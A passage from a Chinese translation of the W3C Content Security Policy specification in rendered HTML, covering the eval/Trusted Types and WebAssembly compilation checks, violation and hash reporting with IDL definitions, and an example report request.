                                    <p>如果 <var>bodyString</var> 不等于 <var>bodyArg</var> 的 <a data-link-type="dfn"
                                            href="https://www.w3.org/TR/trusted-types/#trustedscript-data"
                                            id="ref-for-trustedscript-data">数据</a>，将 <var>isTrusted</var> 设置为
                                        <code>false</code>。
                                    </p>
                            </ol>
                        <li data-md>
                            <p>如果 <var>isTrusted</var> 为 <code>true</code>，则：</p>
                            <ol>
                                <li data-md>
                                    <p class="assertion">断言：<var>parameterArgs</var> 的 [列表/大小=] 等于 [parameterStrings] 的
                                        <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-size"
                                            id="ref-for-list-size">大小</a>。
                                    </p>
                                <li data-md>
                                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                            id="ref-for-list-iterate②④">遍历</a> [参数] <a data-link-type="dfn"
                                            href="https://infra.spec.whatwg.org/#the-range"
                                            id="ref-for-the-range">范围</a> 0 至 [参数]：</p>
                                    <ol>
                                        <li data-md>
                                            <p>令 <var>arg</var> 为 <var>parameterArgs</var>[<var>index</var>]。</p>
                                        <li data-md>
                                            <p>如果 <var>arg</var> <a data-link-type="dfn"
                                                    href="https://webidl.spec.whatwg.org/#implements"
                                                    id="ref-for-implements①">实现</a> <code
                                                    class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/trusted-types/#trustedscript" id="ref-for-trustedscript①">TrustedScript</a></code>，则：
                                            </p>
                                            <ol>
                                                <li data-md>
                                                    <p>如果 <var>parameterStrings</var>[<var>index</var>] 不等于
                                                        <var>arg</var> 的 <a data-link-type="dfn"
                                                            href="https://www.w3.org/TR/trusted-types/#trustedscript-data"
                                                            id="ref-for-trustedscript-data①">数据</a>，将
                                                        <var>isTrusted</var> 设置为 <code>false</code>。
                                                    </p>
                                            </ol>
                                        <li data-md>
                                            <p>否则，将 <var>isTrusted</var> 设置为 <code>false</code>。</p>
                                    </ol>
                            </ol>
                        <li data-md>
                            <p>令 <var>sourceToValidate</var> 为在 <var>realm</var> 中创建的新 <code
                                    class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/trusted-types/#trustedscript" id="ref-for-trustedscript②">TrustedScript</a></code>
                                对象，其 <a data-link-type="dfn"
                                    href="https://www.w3.org/TR/trusted-types/#trustedscript-data"
                                    id="ref-for-trustedscript-data②">数据</a> 设置为 <var>codeString</var>，如果
                                <var>isTrusted</var> 为 <code>true</code>，否则为 <var>codeString</var>。
                            </p>
                        <li data-md>
                            <p>令 <var>sourceString</var> 为使用 <code
                                    class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/trusted-types/#trustedscript" id="ref-for-trustedscript③">TrustedScript</a></code>、<var>realm</var>、<var>sourceToValidate</var>、<var>compilationSink</var>
                                和 <code>'script'</code> 执行 <a data-link-type="abstract-op"
                                    href="https://www.w3.org/TR/trusted-types/#abstract-opdef-get-trusted-type-compliant-string"
                                    id="ref-for-abstract-opdef-get-trusted-type-compliant-string">获取受信任类型兼容字符串</a>
                                算法的结果。</p>
                        <li data-md>
                            <p>如果算法抛出错误，则抛出 <code
                                    class="idl"><a data-link-type="idl" href="https://webidl.spec.whatwg.org/#exceptiondef-evalerror" id="ref-for-exceptiondef-evalerror">EvalError</a></code>。
                            </p>
                        <li data-md>
                            <p>如果 <var>sourceString</var> 不等于 <var>codeString</var>，抛出 <code
                                    class="idl"><a data-link-type="idl" href="https://webidl.spec.whatwg.org/#exceptiondef-evalerror" id="ref-for-exceptiondef-evalerror①">EvalError</a></code>。
                            </p>
                    </ol>
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p>令 <var>global</var> 为 <var>realm</var> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-realm-global"
                            id="ref-for-concept-realm-global">全局对象</a>。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate②⑤">遍历</a> <var>global</var> 的 <a data-link-type="dfn"
                            href="#global-object-csp-list" id="ref-for-global-object-csp-list⑦">CSP 列表</a>中的每个
                        <var>policy</var>：
                    </p>
                    <ol>
                        <li data-md>
                            <p>令 <var>source-list</var> 为 null。</p>
                        </li>
                        <li data-md>
                            <p>如果 <var>policy</var> 包含一个<a data-link-type="dfn" href="#directives"
                                    id="ref-for-directives①①">指令</a>，其<a data-link-type="dfn" href="#directive-name"
                                    id="ref-for-directive-name⑦">名称</a>为
                                "<code>script-src</code>"，则将 <var>source-list</var> 设置为该<a data-link-type="dfn"
                                    href="#directives" id="ref-for-directives①②">指令</a>的<a data-link-type="dfn"
                                    href="#directive-value" id="ref-for-directive-value⑨">值</a>。</p>
                            <p>否则，如果 <var>policy</var> 包含一个<a data-link-type="dfn" href="#directives"
                                    id="ref-for-directives①③">指令</a>，其<a data-link-type="dfn" href="#directive-name"
                                    id="ref-for-directive-name⑧">名称</a>为
                                "<code>default-src</code>"，则将 <var>source-list</var> 设置为该指令的<a data-link-type="dfn"
                                    href="#directive-value" id="ref-for-directive-value①⓪">值</a>。</p>
                        </li>
                        <li data-md>
                            <p>如果 <var>source-list</var> 不为 null：</p>
                            <ol>
                                <li data-md>
                                    <p>令 <var>trustedTypesRequired</var> 为执行<a data-link-type="abstract-op"
                                            href="https://www.w3.org/TR/trusted-types/#abstract-opdef-does-sink-type-require-trusted-types"
                                            id="ref-for-abstract-opdef-does-sink-type-require-trusted-types">接收器类型是否需要可信类型？</a>的结果，参数为
                                        <var>realm</var>、
                                        <code>'script'</code> 和 <code>false</code>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>trustedTypesRequired</var> 为 <code>true</code> 且
                                        <var>source-list</var> 包含一个<a data-link-type="dfn" href="#source-expression"
                                            id="ref-for-source-expression②">源表达式</a>，该表达式与字符串 "<a
                                            data-link-type="grammar" href="#grammardef-trusted-types-eval"
                                            id="ref-for-grammardef-trusted-types-eval"><code>'trusted-types-eval'</code></a>"
                                        <a data-link-type="dfn"
                                            href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                            id="ref-for-ascii-case-insensitive①">ASCII 不区分大小写</a>匹配，
                                        则跳过以下步骤。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>source-list</var> 包含一个<a data-link-type="dfn" href="#source-expression"
                                            id="ref-for-source-expression③">源表达式</a>，该表达式与字符串 "<a
                                            data-link-type="grammar" href="#grammardef-unsafe-eval"
                                            id="ref-for-grammardef-unsafe-eval"><code>'unsafe-eval'</code></a>" <a
                                            data-link-type="dfn"
                                            href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                            id="ref-for-ascii-case-insensitive②">ASCII 不区分大小写</a>匹配，则跳过以下步骤。</p>
                                </li>
                                <li data-md>
                                    <p>令 <var>violation</var> 为在 <var>global</var>、<var>policy</var> 和
                                        "<code>script-src</code>" 上执行<a href="#create-violation-for-global">§ 2.4.1
                                            为全局对象、策略和指令创建违规对象</a>的结果。</p>
                                </li>
                                <li data-md>
                                    <p>将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource①①">资源</a>设置为 "<code>eval</code>"。</p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>source-list</var> <a data-link-type="dfn"
                                            href="https://infra.spec.whatwg.org/#list-contain"
                                            id="ref-for-list-contain⑤">包含</a>表达式
                                        "<a data-link-type="grammar" href="#grammardef-report-sample"
                                            id="ref-for-grammardef-report-sample②"><code>'report-sample'</code></a>"，
                                        则将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-sample"
                                            id="ref-for-violation-sample③">样本</a>设置为
                                        <var>sourceString</var> 中包含其前 40 个字符的子字符串。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>在 <var>violation</var> 上执行<a href="#report-violation">§ 5.5 报告违规</a>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-disposition"
                                            id="ref-for-policy-disposition①④">处置方式</a>为 "<code>enforce</code>"，则将
                                        <var>result</var> 设置为
                                        "<code>Blocked</code>"。
                                    </p>
                                </li>
                            </ol>
                        </li>
                    </ol>
                <li data-md>
                    <p>如果 <var>result</var> 为 "<code>Blocked</code>"，抛出 <code>EvalError</code> 异常。</p>
            </ol>
            <h3 class="heading settled" data-level="4.5" id="wasm-integration"><span class="secno">4.5. </span><span
                    class="content">与 WebAssembly 的集成</span><a class="self-link" href="#wasm-integration"></a></h3>
            <p>WebAssembly 定义了 <code
                    class="idl"><a data-link-type="idl" href="https://webassembly.github.io/content-security-policy/js-api/#host-ensure-can-compile-wasm-bytes" id="ref-for-host-ensure-can-compile-wasm-bytes">HostEnsureCanCompileWasmBytes()</a></code>
                抽象操作，该操作允许主机环境阻止将 WebAssembly 源编译为可执行代码。本文档定义了该抽象操作的实现，该实现会检查相关的 <a data-link-type="dfn"
                    href="#global-object-csp-list" id="ref-for-global-object-csp-list⑧">CSP 列表</a>，以确定是否应该阻止此类编译。</p>
            <h4 class="heading settled dfn-paneled algorithm"
                data-algorithm="EnsureCSPDoesNotBlockWasmByteCompilationrealm" data-dfn-type="dfn" data-level="4.5.1"
                data-lt="EnsureCSPDoesNotBlockWasmByteCompilationrealm" data-noexport id="can-compile-wasm-bytes">
                <span class="secno">4.5.1. </span><span
                    class="content">EnsureCSPDoesNotBlockWasmByteCompilation<var>realm</var></span><a class="self-link"
                    href="#can-compile-wasm-bytes" id="ref-for-can-compile-wasm-bytes"></a>
            </h4>
            <p>给定一个 <a data-link-type="dfn" href="https://tc39.github.io/ecma262#realm" id="ref-for-realm①">realm</a>
                <var>realm</var>，如果允许编译，则此算法正常返回，否则抛出 <code
                    class="idl"><a data-link-type="idl" href="https://webassembly.github.io/spec/js-api/#exceptiondef-compileerror" id="ref-for-exceptiondef-compileerror">WebAssembly.CompileError</a></code>：
            </p>
            <ol>
                <li data-md>
                    <p>令 <var>global</var> 为 <var>realm</var> 的<a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-realm-global"
                            id="ref-for-concept-realm-global①">全局对象</a>。</p>
                </li>
                <li data-md>
                    <p>令 <var>result</var> 为 "<code>Allowed</code>"。</p>
                </li>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate②⑥">对于</a> <var>global</var> 的<a data-link-type="dfn"
                            href="#global-object-csp-list" id="ref-for-global-object-csp-list⑨">CSP
                            列表</a>中的每个 <var>policy</var>：</p>
                    <ol>
                        <li data-md>
                            <p>令 <var>source-list</var> 为 null。</p>
                        </li>
                        <li data-md>
                            <p>如果 <var>policy</var> 包含一个<a data-link-type="dfn" href="#directives"
                                    id="ref-for-directives①④">指令</a>，其<a data-link-type="dfn" href="#directive-name"
                                    id="ref-for-directive-name⑨">名称</a>为
                                "<code>script-src</code>"，则将 <var>source-list</var> 设置为该<a data-link-type="dfn"
                                    href="#directives" id="ref-for-directives①⑤">指令</a>的<a data-link-type="dfn"
                                    href="#directive-value" id="ref-for-directive-value①①">值</a>。</p>
                            <p>否则，如果 <var>policy</var> 包含一个<a data-link-type="dfn" href="#directives"
                                    id="ref-for-directives①⑥">指令</a>，其<a data-link-type="dfn" href="#directive-name"
                                    id="ref-for-directive-name①⓪">名称</a>为
                                "<code>default-src</code>"，则将 <var>source-list</var> 设置为该指令的<a data-link-type="dfn"
                                    href="#directive-value" id="ref-for-directive-value①②">值</a>。</p>
                        </li>
                        <li data-md>
                            <p>如果 <var>source-list</var> 非 null，且不包含与字符串 "<a data-link-type="grammar"
                                    href="#grammardef-unsafe-eval"
                                    id="ref-for-grammardef-unsafe-eval①"><code>'unsafe-eval'</code></a>" <a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive③">ASCII 不区分大小写</a>匹配的<a data-link-type="dfn"
                                    href="#source-expression" id="ref-for-source-expression④">源表达式</a>，也不包含与字符串 "<a
                                    data-link-type="grammar" href="#grammardef-wasm-unsafe-eval"
                                    id="ref-for-grammardef-wasm-unsafe-eval"><code>'wasm-unsafe-eval'</code></a>" <a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive④">ASCII 不区分大小写</a>匹配的<a data-link-type="dfn"
                                    href="#source-expression" id="ref-for-source-expression⑤">源表达式</a>，则：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>令 <var>violation</var> 为在 <var>global</var>、<var>policy</var> 和
                                        "<code>script-src</code>" 上执行<a href="#create-violation-for-global">§ 2.4.1
                                            为全局对象、策略和指令创建违规对象</a>的结果。</p>
                                </li>
                                <li data-md>
                                    <p>将 <var>violation</var> 的<a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource①②">资源</a>设置为 "<code>wasm-eval</code>"。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>在 <var>violation</var> 上执行<a href="#report-violation">§ 5.5 报告违规</a>。
                                    </p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-disposition"
                                            id="ref-for-policy-disposition①⑤">处置方式</a>为 "<code>enforce</code>"，则将
                                        <var>result</var> 设置为
                                        "<code>Blocked</code>"。
                                    </p>
                                </li>
                            </ol>
                        </li>
                    </ol>
                </li>
                <li data-md>
                    <p>如果 <var>result</var> 为 "<code>Blocked</code>"，则抛出 <code
                            class="idl"><a data-link-type="idl" href="https://webassembly.github.io/spec/js-api/#exceptiondef-compileerror" id="ref-for-exceptiondef-compileerror①">WebAssembly.CompileError</a></code>
                        异常。</p>
                </li>
            </ol>
        </section>
        <section>
            <h2 class="heading settled" data-level="5" id="reporting"><span class="secno">5. </span><span
                    class="content">报告</span><a class="self-link" href="#reporting"></a></h2>
            <p>当一个或多个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object②⑥">策略</a>的指令被违反时，可能会生成并发送一个 <dfn class="dfn-paneled"
                    data-dfn-type="dfn" data-export id="csp-violation-report">CSP 违规报告</dfn> 到与该 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑦">策略</a>关联的报告终端。
            </p>
            <p><a data-link-type="dfn" href="#csp-violation-report" id="ref-for-csp-violation-report">CSP 违规报告</a>的 <a
                    data-link-type="dfn" href="https://w3c.github.io/reporting/#report-type"
                    id="ref-for-report-type">报告类型</a>为 "csp-violation"。</p>
            <p><a data-link-type="dfn" href="#csp-violation-report" id="ref-for-csp-violation-report①">CSP 违规报告</a>对 <a
                    data-link-type="dfn" href="https://w3c.github.io/reporting/#visible-to-reportingobservers"
                    id="ref-for-visible-to-reportingobservers"> <code>ReportingObserver</code> </a>可见。</p>
            <pre class="idl highlight def">[<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Exposed" id="ref-for-Exposed"><c- g>Exposed</c-></a>=<c- n>Window</c->]
<c- b>interface</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="interface" data-export id="cspviolationreportbody"><code><c- g>CSPViolationReportBody</c-></code></dfn> : <a data-link-type="idl-name" href="https://www.w3.org/TR/reporting-1/#reportbody" id="ref-for-reportbody"><c- n>ReportBody</c-></a> {
  [<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Default" id="ref-for-Default"><c- g>Default</c-></a>] <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-object" id="ref-for-idl-object"><c- b>object</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="method" data-export data-lt="toJSON()" id="dom-cspviolationreportbody-tojson"><code><c- g>toJSON</c-></code></dfn>();
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString"><c- b>USVString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-cspviolationreportbody-documenturl"><code><c- g>documentURL</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString①"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-referrer"><code><c- g>referrer</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString②"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-blockedurl"><code><c- g>blockedURL</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString"><c- b>DOMString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-cspviolationreportbody-effectivedirective"><code><c- g>effectiveDirective</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString①"><c- b>DOMString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-cspviolationreportbody-originalpolicy"><code><c- g>originalPolicy</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString③"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-sourcefile"><code><c- g>sourceFile</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString②"><c- b>DOMString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="DOMString?" id="dom-cspviolationreportbody-sample"><code><c- g>sample</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="SecurityPolicyViolationEventDisposition" id="dom-cspviolationreportbody-disposition"><code><c- g>disposition</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short" id="ref-for-idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned short" id="dom-cspviolationreportbody-statuscode"><code><c- g>statusCode</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long?" id="dom-cspviolationreportbody-linenumber"><code><c- g>lineNumber</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long①"><c- b>unsigned</c-> <c- b>long</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long?" id="dom-cspviolationreportbody-columnnumber"><code><c- g>columnNumber</c-></code></dfn>;
};
</pre>
            <p>当影响<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#request-destination-script-like"
                    id="ref-for-request-destination-script-like">类似脚本的</a><a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request-destination"
                    id="ref-for-concept-request-destination①">目标</a>的指令具有 <code>report-sha256</code>、
                <code>report-sha384</code> 或 <code>report-sha512</code> 值，并且获取了具有<a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#request-destination-script-like"
                    id="ref-for-request-destination-script-like①">类似脚本的</a><a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request-destination"
                    id="ref-for-concept-request-destination②">目标</a>的<a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⑤">请求</a>时，将生成一个
                <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="csp-hash-report">csp 哈希报告</dfn>并将其发送到与<a
                    data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object②⑧">策略</a>关联的报告端点。
            </p>
            <p><a data-link-type="dfn" href="#csp-hash-report" id="ref-for-csp-hash-report">csp 哈希报告</a>具有<a
                    data-link-type="dfn" href="https://w3c.github.io/reporting/#report-type"
                    id="ref-for-report-type①">报告类型</a> "csp-hash"。</p>
            <p><a data-link-type="dfn" href="#csp-hash-report" id="ref-for-csp-hash-report①">csp 哈希报告</a>对 <a
                    data-link-type="dfn" href="https://w3c.github.io/reporting/#visible-to-reportingobservers"
                    id="ref-for-visible-to-reportingobservers①"><code>ReportingObserver</code> 不可见</a>。</p>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-noexport id="csp-hash-report-body">csp
                    哈希报告主体</dfn>是一个包含以下字段的<a data-link-type="dfn" href="https://infra.spec.whatwg.org/#struct"
                    id="ref-for-struct">结构体</a>：<dfn class="dfn-paneled" data-dfn-for="csp hash report body"
                    data-dfn-type="dfn" data-noexport id="csp-hash-report-body-documenturl">documentURL</dfn>、<dfn
                    class="dfn-paneled" data-dfn-for="csp hash report body" data-dfn-type="dfn" data-noexport
                    id="csp-hash-report-body-subresourceurl">subresourceURL</dfn>、<dfn class="dfn-paneled"
                    data-dfn-for="csp hash report body" data-dfn-type="dfn" data-noexport
                    id="csp-hash-report-body-hash">hash</dfn>、<dfn class="dfn-paneled"
                    data-dfn-for="csp hash report body" data-dfn-type="dfn" data-noexport
                    id="csp-hash-report-body-destination">destination</dfn>、<dfn class="dfn-paneled"
                    data-dfn-for="csp hash report body" data-dfn-type="dfn" data-noexport
                    id="csp-hash-report-body-type">type</dfn>。</p>
            <div class="example" id="example-f176bd19">
                <a class="self-link" href="#example-f176bd19"></a> 当文档的响应包含以下标头时：
                <pre class="language-http highlight">Reporting-Endpoints: hashes-endpoint="https://example.com/reports"
Content-Security-Policy: script-src 'self' 'report-sha256'; report-to hashes-endpoint
</pre>
                <p>并且文档加载脚本 "main.js" 时，将发送类似于以下内容的报告：</p>
                <pre class="language-http highlight"><c- nf>POST</c-> <c- nn>/reports</c-> <c- kr>HTTP</c-><c- o>/</c-><c- m>1.1</c->
<c- e>Host</c-><c- o>:</c-> <c- l>example.com</c->
...
Content-Type: application/reports+json

[{
  "type": "csp-hash-report",
  "age": 12,
  "url": "https://example.com/",
  "user_agent": "Mozilla/5.0 (X11; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0",
  "body": {
    "document_url": "https://example.com/",
    "subresource_url": "https://example.com/main.js",
    "hash": "sha256-85738f8f9a7f1b04b5329c590ebcb9e425925c6d0984089c43a022de4f19c281",
    "type": "subresource",
    "destination": "script"
  }
}]
</pre>
            </div>
            <h3 class="heading settled" data-level="5.1" id="violation-events"><span class="secno">5.1. </span><span
                    class="content">违规 DOM 事件</span><a class="self-link" href="#violation-events"></a></h3>
            <pre class="idl highlight def"><c- b>enum</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="enum" data-export id="enumdef-securitypolicyviolationeventdisposition"><code><c- g>SecurityPolicyViolationEventDisposition</c-></code></dfn> {
  <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventDisposition" data-dfn-type="enum-value" data-export id="dom-securitypolicyviolationeventdisposition-enforce"><code><c- s>"enforce"</c-></code></dfn>, <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventDisposition" data-dfn-type="enum-value" data-export id="dom-securitypolicyviolationeventdisposition-report"><code><c- s>"report"</c-></code></dfn>
};

[<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Exposed" id="ref-for-Exposed①"><c- g>Exposed</c-></a>=(<c- n>Window</c->,<c- n>Worker</c->)]
<c- b>interface</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="interface" data-export id="securitypolicyviolationevent"><code><c- g>SecurityPolicyViolationEvent</c-></code></dfn> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#event" id="ref-for-event"><c- n>Event</c-></a> {
    <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="constructor" data-export data-lt="SecurityPolicyViolationEvent(type, eventInitDict)|constructor(type, eventInitDict)|SecurityPolicyViolationEvent(type)|constructor(type)" id="dom-securitypolicyviolationevent-securitypolicyviolationevent"><code><c- g>constructor</c-></code></dfn>(<a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString③"><c- b>DOMString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type, eventInitDict), SecurityPolicyViolationEvent/constructor(type, eventInitDict), SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type), SecurityPolicyViolationEvent/constructor(type)" data-dfn-type="argument" data-export id="dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"><code><c- g>type</c-></code></dfn>, <c- b>optional</c-> <a data-link-type="idl-name" href="#dictdef-securitypolicyviolationeventinit" id="ref-for-dictdef-securitypolicyviolationeventinit"><c- n>SecurityPolicyViolationEventInit</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type, eventInitDict), SecurityPolicyViolationEvent/constructor(type, eventInitDict), SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type), SecurityPolicyViolationEvent/constructor(type)" data-dfn-type="argument" data-export id="dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"><code><c- g>eventInitDict</c-></code></dfn> = {});
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString④"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-documenturi"><code><c- g>documentURI</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑤"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-referrer"><code><c- g>referrer</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑥"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-blockeduri"><code><c- g>blockedURI</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString④"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-effectivedirective"><code><c- g>effectiveDirective</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑤"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-violateddirective"><code><c- g>violatedDirective</c-></code></dfn>; // historical alias of effectiveDirective
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑥"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-originalpolicy"><code><c- g>originalPolicy</c-></code></dfn>;
